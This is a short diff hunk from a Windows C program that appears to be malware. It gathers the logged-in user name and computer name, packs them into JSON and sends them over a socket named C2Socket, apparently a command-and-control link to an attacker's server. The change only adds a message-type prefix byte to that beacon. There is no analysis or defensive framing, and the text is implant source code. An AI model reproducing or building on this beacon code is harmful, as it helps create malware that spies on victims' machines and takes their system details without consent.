@@ -272,7 +272,7 @@ int main() {
         DWORD USize = 255;
         GetUserNameA(UserName, &USize);
         GetComputerNameA(ComputerName, &USize);
-        int size = snprintf(UserInfo, 1024, "{\"User\":\"%s\",\"Com\":\"%s\"}", UserName, ComputerName);
+        int size = snprintf(UserInfo, 1024, "\x01{\"User\":\"%s\",\"Com\":\"%s\"}", UserName, ComputerName);
         if (SendBuffer(C2Socket, UserInfo, size) == INVALID_SOCKET) {
           closesocket(C2Socket);
           C2Socket = INVALID_SOCKET;
